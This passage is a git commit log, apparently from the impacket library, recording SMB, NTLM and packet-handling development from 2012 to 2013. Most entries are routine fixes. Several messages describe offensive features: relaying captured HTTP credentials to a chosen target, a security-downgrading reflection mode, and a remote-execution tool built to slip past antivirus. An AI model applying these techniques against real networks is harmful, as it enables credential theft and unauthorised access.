commit c75eaebdb31e5a69f5a7c4506a00de559c587d0b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 14 23:03:31 2013 +0000

    Not using *SMBSERVER anymore, instead, using the host IP address

commit 6beb278713a767e655cb3f3f8e237d4fb679ef11
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue May 14 23:00:48 2013 +0000

    Fixed bug that would send *SMBSERVER when connecting against a Windows machine with SMB1 only, and also specifying remoteName = '*SMBSERVER' when calling SMBConnection. This usually shouldn't happen but I'm sure there are still old code out there specifying *SMBSERVER as the remote name. In fact, smbclient.py does that (my faul )

commit c6c1ccd2916c2019840e06a8db3c0ca281246819
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 13 18:16:52 2013 +0000

    VLAN tagging (IEEE 802.1Q and 802.1ad) support for ImpactPacket.
    This basically merges the patches and unit test sent by dan.pisi.
    
    Check http://code.google.com/p/impacket/issues/detail?id=24 for more details.

commit 70757ee97c21708b451a3179bec846fd2e81c980
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 6 16:58:09 2013 +0000

    Going back again to a development version

commit 1305350d688868a0872339ad82c0c1870636ee9b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon May 6 16:05:14 2013 +0000

    Updates version number before releasing

commit 01c3a1fd37c0ce18510ebdc5dc877062d670f83c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 5 20:56:20 2013 +0000

    Moving the debug message to the handler constructor so we don't log it for every request.

commit d0c8b4c377cfbc520781708a5b156dc394d211ee
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun May 5 15:39:19 2013 +0000

    Fixes on NTLMAuthNegotiate to better handle situations where VERSION field is sent by the client, plus correctly setting the right flags if hostname and domain are provided.

commit b4827384cd8293ed52714eca0674568cf2a4f224
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 4 21:44:22 2013 +0000

    Removed debug message

commit d7b174c447e0d109eee71a4fed8217c9ae3895b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat May 4 21:42:48 2013 +0000

    Now we also bind to HTTP and relay those credentials to whatever target specified

commit cf7841b35bb430a7d921a6a12fb6cb206de2f33c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 1 00:14:12 2013 +0000

    We were logging the wrong target IP when saying whether or not authentication worked.

commit 6f5a4d096e1cc4ffe3ef6491fd8490e399597b3c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 1 00:04:16 2013 +0000

    We don't need this anymore

commit fb40ee51eaf31c86fa5255aebd9c10eda39d9509
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed May 1 00:02:40 2013 +0000

    And moving it here

commit 7b64e4b469444169b80200770208c0509eca3f9c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 23:57:09 2013 +0000

    We don't need to have this script on a separate directory anymore

commit c292f77e8bda178309eef0223c0210e2f982e8ef
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 23:56:37 2013 +0000

    Getting rid of the need of a smb.conf file. We're setting the required configuration parameters programmatically

commit ed906102e8a9cbcbccd2667a99d59b6782f5abeb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 19:17:17 2013 +0000

    Some extra fields completed

commit 8a56382f413b7b21e707ae661d75adb79a9da24e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 15:47:36 2013 +0000

    correct the name of the package

commit d9c62492d54c72a706d0c746d799041e5cdf7342
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 30 14:59:50 2013 +0000

    Clarified requirements

commit 9c6af7834f54fa6ffcffe61be173979aa6cca6ac
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Apr 29 16:27:45 2013 +0000

    Another alternative to psexec. Less capabilities but might work on tight AV environments.

commit 92e6b8b734321f960986420aa3d957a4856a929e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Apr 25 22:07:46 2013 +0000

    Fixup imports, requiring it comes from impacket

commit 4da7746638dfe67b22c13860d3a78690d8255028
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Apr 24 02:19:13 2013 +0000

    class.__str__ calls class.getData(), hence, changing stuff must happen there.

commit 82a14b22366c6881c7bbf35a1f69761b3b58895c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 16 17:52:48 2013 +0000

    Added impacket.examples so the installation script install all the required files

commit 8b6e35460f8890c514e5564a79035acf630f9db0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 9 18:40:15 2013 +0000

    Changed smbconnection so it automatically detects what SMB version is supported on the other side, instead of doing the old try: except: workaround that would take longer against servers supporting only SMBv1.
    See [MS-SMB2] section 1.7.
    
    In order to do this we had to craft the SMB_NEGOTIATION packet at the SMBConnection level, and then pass the NetBIOSSession to the smb3/smb layer.

commit 743b55c75dc7b20a02e00a854fe6031e3d82abd2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Apr 9 14:11:32 2013 +0000

    Fix a typo in set_icmp_gwaddr() as reported by dirdi.

commit aa89d7717e5eebe87aadeab321393a9c90d0a587
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Mar 8 21:09:46 2013 +0000

    Replace the reserved field expecting just zero values, to expect anything.. in any case we're not using them.. and some random smb servers might return non zero values

commit 6a84516583ccf5dbc78e5b33ff3bec67bf301ee6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 30 16:31:08 2012 +0000

    Fixed os.mkdir() not being inside a try/catch .. Triggering an un handled exception when trying to create a directory inside a readonly filesystem (for example)

commit 1ec29aa5df9d7081fa823329fe7c7780c7b7147d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Dec 20 19:05:51 2012 +0000

    domain was missing when setting credentials for a DCERPC call

commit fac965731a328741ae34053bcec9c9c1561bf99f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Dec 15 23:37:44 2012 +0000

    Fixes bug reported by Renaud Dubourguais that would make the domain/lmhash/nthash to be discarded when calling this method

commit 369dd3b69733ea6c6703c535162c5e8a27ffe5c5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 4 15:58:37 2012 +0000

    Missing space in EncryptionKey generation, it should be 'ServerIn \x00'.
    
    Reported by Amir Sela

commit 3fb6b86693d472761ff5ef667b5a970d0bcdc712
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 22 14:42:26 2012 +0000

    Don't try to read a 0 bytes file if we alreay know so..

commit 87c96be3e4a6e440c612c551d070d1d8b7aae3d8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 22 14:41:12 2012 +0000

    Log the exception instead of printing it out

commit 8b881cef15ff61e4171700d48cecc936de470cdc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Nov 19 16:54:24 2012 +0000

    When answering a CREATE_DIRECTORY request, check it starts with '/' before stripping it.

commit 2adb9e477f6c065618e264db73403206ba4b4ef2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Oct 22 16:55:10 2012 +0000

    Fixes http://code.google.com/p/impacket/issues/detail?id=20

commit 1907cc7a8072c7326d6a8584aa09a01bb69b97c8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Oct 7 15:32:34 2012 +0000

    SMBBackwardCompatibilityTransport needs the pipe to connect to

commit b01a6ece417fbb81f1e8d55a041263b933631361
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 6 22:18:17 2012 +0000

    No more share list through LANMAN.. now using RPC by default

commit 15de0e039b118b33d52daf804667f341fd5bc283
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 6 22:10:44 2012 +0000

    Unicode support for smbserver.
    It will advertise itself supporting Unicode, but should also work if the client does not.
    Still pending testing

commit 4037a5bd2f830545dba2ad6383b5dd0b2cd3a97c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Oct 6 19:00:11 2012 +0000

    In REFLECTION mode, downgrade to standard security. This seems to be more effective on certain OS versions

commit b9507e47b5c3b68b637ad526c714098eb0ab86e8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 4 20:33:24 2012 +0000

    Deny anonymous logon on standard security auth too

commit a298b54ce99605ae3e69eb62a94343b485a70997
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 4 20:28:50 2012 +0000

    _dialects_data['Payload'] = '' moved up 'cause it's needed in case there's an encrption key

commit 67f7f4fec04f6f6e5a774dad7b78618e39b29d1d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 4 16:15:23 2012 +0000

    1) Fixup imports
    2) Send LOGON_FAILURE if the client attempts to connect as anonymous

commit 0eca55ea429e918c46447c24c30555bdec54dc26
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Oct 3 19:05:34 2012 +0000

    Imports fixup

commit 4dced7beb8359b9088f9cce3c5667c2b056bcc7b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Sep 19 20:47:41 2012 +0000

    Fixes http://code.google.com/p/impacket/issues/detail?id=19.
    
    I think I found a clever way to detect whether the data sent is standard security or extended security w/o checking the SMB Flags

commit 7e1d1d2288ed352ea93cebe32cb7896b5911d068
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 13 22:06:16 2012 +0000

    Missing setting the ChallengeLength when accepting standard security/no encryption key authentication.
    
    Fixes: http://code.google.com/p/impacket/issues/detail?id=17

commit 3450e59a2d4297dd5851ca7af95c5e4f67b6a72c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 13 14:39:12 2012 +0000

    Checking data received trying to detect the connection is closed and not throwing an exception

commit 81e603ef6da9fad9c669a2689773b40c667a24cd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 10 21:31:21 2012 +0000

    Changing the scope of the classes' attributes to make it easier subclassing

commit e610e70aa25047294e99c2fa48734117f85e73c8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Sep 10 19:40:25 2012 +0000

    Fixed http://code.google.com/p/impacket/issues/detail?id=14 .
    There were other instances where id() was used in this way.. provoking an overflow.

commit 2a8b58cf02fd7fd4a24c2adf1cd9198f88555802
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Sep 7 15:15:43 2012 +0000

    Although [MS-CIFS] defines SMB_COM_WRITE_ANDXas:
    
    SMB_Parameters{
    [..]
    Reserved;
    DataLength;
    DataOffset; -> Offset from the begining of the SMB Packet to the data
    OffsetHigh (optional);
    }
    
    SMB_Data
    {
    USHORT ByteCount;
    Bytes
    {
    UCHAR Pad;
    UCHAR Data[DataLength];
    }

commit f825155642e7a3cb77270fbb981a4f3cd3295ff1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 6 22:46:08 2012 +0000

    Fixes http://code.google.com/p/impacket/issues/detail?id=13 reported by Bryan.
    socket should use send(), not write().

commit 02c3d7b75151d8fa8c8ca2d59a4d3029513672b9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 6 04:26:22 2012 +0000

    Reading the StdErr pipe using readFile() now.. Makes it work

commit e4ea903f3d7782f1b085baa181fd93e2bc3bee3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 6 04:02:02 2012 +0000

    ChallengeLength must be treated different depending on extended security on/off:
    
    ChallengeLength (1 byte): When the CAP_EXTENDED_SECURITY bit is set, the server MUST set this value to zero and clients MUST ignore this value.
    
    and when CAP_EXTENDED_SECURITY is not set:
    ChallengeLength (1 byte): This field MUST be 0x00 or 0x08. The length of the random challenge used in challenge/response authentication. If the server does not support challenge/response authentication, this field MUST be 0x00. This field is often referred to in older documentation as EncryptionKeyLength.

commit e6a9c5cd3c84dc839844835d476cc4e527870805
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Sep 6 03:06:04 2012 +0000

    We're not relying on client's capabilities based on the negotiate packet, but still looking at the Flags2 to decide whether or not extended security is supported.
    Fixes http://code.google.com/p/impacket/issues/detail?id=12 reported by Bryan

commit 5a8a6d1f2d4b749d23f30de8f6e08e7dcf39ca3a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 4 02:03:28 2012 +0000

    Adding tests for all dialects

commit 9e276c18b0f0355453f0243500a96a7e9f983574
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 4 01:33:09 2012 +0000

    typo

commit 031fc5e25415e23c520c0772facd3e3332ad0c85
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Sep 4 01:27:34 2012 +0000

    Completing some aliases

commit f999d5336588bb2bf371a2ef8e3ca4b00c607cff
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 30 20:25:03 2012 +0000

    When a stringbinding returned by the portmapper has '0.0.0.0' we should replace it by the servers IP address

commit 0306a10d24bba2cb0adb13317f6a6e37579b7834
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Aug 28 12:39:56 2012 +0000

    If login is unsuccessful, clean all the internal variables in case user wants to authenticate again within the same connection

commit 1938dcf0d6fff52d10d861b9f8508704c4ff4ce0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 22:10:06 2012 +0000

    Initialization of self._NetBIOSSession to None. Important if something goes wrong before the connection is made

commit 7909c3292033a174ce2136c49b26fe6fc85b96bc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 22:09:27 2012 +0000

    global dialect variable added, once the first SMB connection is made, we hold the chosen dialect there, speeds up the process for w2k and xp

commit 53dfafc0f5ea2c26fd1f8c70cbd1b11262325d75
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 19:11:12 2012 +0000

    Test case for SMBConnection, still lots to do to test things right

commit 41623744c5373f19cd30b5f04631492e60d98d55
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 19:09:24 2012 +0000

    Porting smbclient to SMBConnection methods

commit f5eb286882f29d8d8950cb9aabda0314642b6212
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 18:24:22 2012 +0000

    Ported to the SMBConnection concept. Much simpler and SMB version independent. It will pick the best SMB Version when connecting

commit 633127140d6b642012bd0f1503e7d32fc0b67277
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 18:21:24 2012 +0000

    1) SMBTransport now uses SMBConnection methods.
    For backward compatibility it will try to detect if a SMBServer (not SMBConnection) was sent as parameter and will return a SMBBackwardCompatibilityTransport() (old behaviour).
    2) Exporting a method preferred_dialect() if you want to specify the specific SMB dialect you wanna use

commit 94bdb870f064d700df56df720e8be6e8c28b6d2c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 18:18:10 2012 +0000

    This helper library now works with the SMBConnection methods. If for some reason it receives an SMBServer as parameter, it will convert it to a SMBConnection

commit a10e5f8f2953d54df068700249a2d887b2707a3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 18:16:21 2012 +0000

    Just a clarification

commit ef081f731119e9edc1789157754836a75447fa10
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 17:00:28 2012 +0000

    1) Allow an existing connection to be sent to the constructor
    2) writeNamedPipe uses writeFile instead of TransactNamedPipe()

commit 86fbb1e8b240acb4ac03cfe0efa25f879f5e2bb5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Aug 25 16:59:02 2012 +0000

    waitAnswer on write()

commit 4f0f4e5fb00f7780234caa54300b90c727df09bc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 22:05:24 2012 +0000

    setTimeout() added

commit ec3581c8963d21bf086218ecea67d85a982f708d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 20:32:19 2012 +0000

    1) openFile opens the file for READ/WRITE by default
    2) Fixed bug in writeNamedPipe()

commit 570bb2414f4dce34befd6a3ab9b6c2bad2754ea6
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 19:56:58 2012 +0000

    1) Added transactNamedPipeRecv()
    2) Fixed bug in openFile

commit 658d9e787ea6c6df3b31d2c499d394a83865f40c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 18:33:02 2012 +0000

    1) Added rename()
    2) Added readNamedPipe()
    3) Added writeNamedPipe()
    4) Fixed transactNamedPipe()
    5) Added listShares()

commit d15a11c2784fe07a548f2756801e39e47bd34f0c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 18:30:59 2012 +0000

    replace should be done against old_path and new_path

commit 5d75ab67bb8478fcb36d090b201da5c55e4ea7f5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 18:23:35 2012 +0000

    1) Added SMB_SET_INFO
    2) Added rename() higher level function

commit 95f2c02d09e6b82c994b504d6c3d717e23a06d5e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 17:06:06 2012 +0000

    WaitNamedPipe now accepts timeout

commit b39527293d16d6f579545bc7d2a9b4f6c87e2c57
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 16:53:51 2012 +0000

    we call writeFile for SMB/1/2/3 instead of write_andx. We have to take care of the amount of data that can be written if signing is enabled

commit 4405cdc180322b639a2ed321cba110552b95479b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 16:52:58 2012 +0000

    writeFile() added

commit 6dd5cd7b505b289476b8b039948a03c23d0906bb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 16:52:38 2012 +0000

    writeFile() added

commit b08c37bb71e270c238831aa520a8888b0c716413
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Aug 20 00:50:45 2012 +0000

    Removing a debug msg

commit 57e0a87d503c3ae73950d1a110cbb8c253a5ba05
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 19 23:32:25 2012 +0000

    First version of smbconnection, not yet finished:
    # Wrapper class for SMB1/2/3 so it's transparent for the client.
    # You can still play with the low level methods (version dependant)
    # by calling getSMBServer()

commit a50394e80333328045e685b2894cc4ef554b569d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 19 23:14:12 2012 +0000

    1) preferredDialect added to the SMB3 class.__init__. Allowing to select an specific dialect to use
    2) getDialect() added
    3) backward alias get_server_os added
    4) del() added

commit 84670d2a2fbfc11802100874fa089902dc87033d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Aug 19 23:11:47 2012 +0000

    getDialect() added
    replacing '/' for '\\' for all the functions that deal with pathnames

commit d12d7196ec4bbd9eacc7fd1b71a2f1187d3fd5c3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 21:31:43 2012 +0000

    Sign also for SMB2_DIALECT_002

commit 6f0791509e6cfd3f0f5c9a50d467294cb09d978e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 14:06:40 2012 +0000

    Added useTimeout() and remove()

commit d43162f9f393cced45a340f7a0e983992c2dd749
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 13:38:59 2012 +0000

    NT_STATUS errors are now STATUS errors

commit ae5194fc8966b6cae54d2211af96c5e8d176dd0e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 13:30:38 2012 +0000

    Removing all the spnego stuff and importing spnego.py

commit 1cadbcad06a2214757563b63133323dd911cb82d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 13:29:45 2012 +0000

    Using spnego.py instead of smb.py for the spnego functions

commit 59f47b2ccba857adafce903069e5ce0658a5787a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 13:20:52 2012 +0000

    Using spnego.py instead of smb.py for the spnego functions

commit 677f737261c5f5310368d53de6d2bc46d2668d67
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 01:39:04 2012 +0000

    SMB3 signing now working if the server enforces it. The rest of the key derivations are also calculated, needed whenever we implement encryption

commit 1954029cdffc1e30fcad39e1ccdd37de95377837
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Aug 17 01:04:03 2012 +0000

    Extra crypto stuff needed for SMB3 signing and encryption:
    #   RFC 4493 implementation (http://www.ietf.org/rfc/rfc4493.txt)
    #   RFC 4615 implementation (http://www.ietf.org/rfc/rfc4615.txt)
    #
    #   NIST SP 800-108 Section 5.1, with PRF HMAC-SHA256 implementation
    #   (http://tools.ietf.org/html/draft-irtf-cfrg-kdf-uses-00#ref-SP800-108)
    #

commit 5c63d6be065faca3c1c3eb98a1ea88762173369f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 16 19:18:18 2012 +0000

    connect tree path must have be UNC like for Windows 8 to like it

commit 3f7e5da9a98d2dd7e5bcd97e7e7405311bcb47f1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Aug 16 00:29:15 2012 +0000

    StructureSize must be 25 for SessionSetup, if we want Windows 8 to be happy.
    
    So far it can authenticate.. still pending all the new SMB3 signing stuff

commit f69673c59696528d072b98336284fa5a96fb3a31
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 23:52:50 2012 +0000

    Putting all this stuff separate. we should take it all of from smb.py (not yet)

commit 964d3f208c4f729d6002e7d4845894db5e898344
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 22:57:06 2012 +0000

    Updated info

commit 80b5580dfa9a79e686d7f023aa3284e7d6feaaaf
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 22:53:45 2012 +0000

    1) Added waitNamedPipe()

commit 93026c2982de8fbbfe89e5809ed67c66a7ac39f9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 21:49:44 2012 +0000

    Forgot to remove the other pair of the share inside self._Session['TreeConnectTable']

commit fb55dac69082c68f0f36246e7162443d1c2f8654
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 20:01:43 2012 +0000

    1) oopps! forgot to deep copy the TREE_CONNECT, OPEN and FILE dicts
    2) set_timeout() added
    3) working on nt_create_andx when cmd is sent

commit 0fc0a1fda1ea0c7d642add524229dc71146a77f9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 18:08:21 2012 +0000

    1) Added stor_file()
    For testing purposes.. smbclient should work with SMB2/3 with you change the do_open() to:
            self.smb = smb3.SMB3(remote_name, host, sess_port=int(port))

commit b24b15a99358f4d8baa2649588767f0cd8103576
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 17:21:26 2012 +0000

    1) Added SMB_QUERY_INFO call
    2) Added retr_file()
    3) Added open_andx() in the backward compatibility section

commit 0b253b8509b42c525250157ac444fe5eeee86493
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 17:15:57 2012 +0000

    when retrieving a file, don't create the file with a full pathname, just in the current dir.

commit 538a0bb17a51c2401c2e443d76c237273f0a2a3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 15:05:11 2012 +0000

    When doing CD, check the directory actually exists

commit 202b0ef4139c412cf2b1d1d91281f24ed2284014
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 13:58:01 2012 +0000

    One more use of ntpath

commit 5615c25457f8fd6d1cde6a691cb82d871ca1df5a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 03:26:29 2012 +0000

    1) Added mkdir(), rmdir()
    2) If connecting to a tree that is already connected, don't connect again, just return the treeId

commit 67597966608afb38a00cf319e52d67f90e48fef1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 03:07:45 2012 +0000

    Using ntpath to join directories, much safer and clean

commit f927429eddb2ba18114a1f47bae592be8826ce3f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 01:22:04 2012 +0000

    Added list_path()

commit 275c011a4542c1e6b0e0b3b64a32367bdb5628a9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Aug 15 00:53:32 2012 +0000

    SMBFindFileNamesInfo() has now a UnicodeType as well

commit d123563013e08c8be3316126ccbe5dabe39f8ff1
